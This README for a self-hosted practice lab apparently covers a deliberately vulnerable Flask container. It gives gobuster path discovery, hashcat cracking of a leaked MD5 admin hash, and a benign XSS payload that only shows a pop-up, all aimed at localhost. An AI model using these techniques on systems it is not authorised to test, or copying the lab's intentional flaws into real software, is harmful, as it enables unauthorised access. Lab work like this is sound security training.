# sbim_dirbuster

### Pt. 0: Setup

To build the container, use the following command:

`sudo docker build -t flask-hidden . `

Now the container can be started with this command:

`sudo docker run -d -p 6969:5000 flask-hidden`

The docker container port `5000` should be exposed to the port `6969`!

---

### Pt. 1: Gobuster

After its up, we can discover the hidden paths wir gobuster:

`sudo gobuster dir -u http://localhost:6969 -w /path/to/wordlist`

---

### Pt. 2: Password Cracking

Go to the discovered `/admin` path. There you can read: `haha here is the password, but hashed: ec0e2603172c73a8b644bb9456c1ff6e`.

To crack it, you can use hashcat:

`echo "ec0e2603172c73a8b644bb9456c1ff6e" > hashes.txt`

`hashcat -m 0 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt`

`echo cracked.txt`

---

### Pt. 3: XSS

Go to the discovered `/secret` route. 

In the input field, enter a payload like:

```
<script>
    let alertBox = document.createElement('div');
    alertBox.style.position = 'fixed';
    alertBox.style.top = '50%';
    alertBox.style.left = '50%';
    alertBox.style.transform = 'translate(-50%, -50%)';
    alertBox.style.padding = '20px';
    alertBox.style.backgroundColor = '#ff69b4';
    alertBox.style.color = '#fff';
    alertBox.style.fontFamily = 'Comic Sans MS, sans-serif';
    alertBox.style.fontSize = '20px';
    alertBox.style.border = '5px solid #fff';
    alertBox.style.borderRadius = '15px';
    alertBox.style.boxShadow = '0px 0px 15px rgba(0, 0, 0, 0.2)';
    alertBox.style.zIndex = '9999';
    alertBox.innerHTML = '💥 Boom! 💥';

    document.body.appendChild(alertBox);

    setTimeout(() => {
        document.body.removeChild(alertBox);
    }, 3000);
</script>
```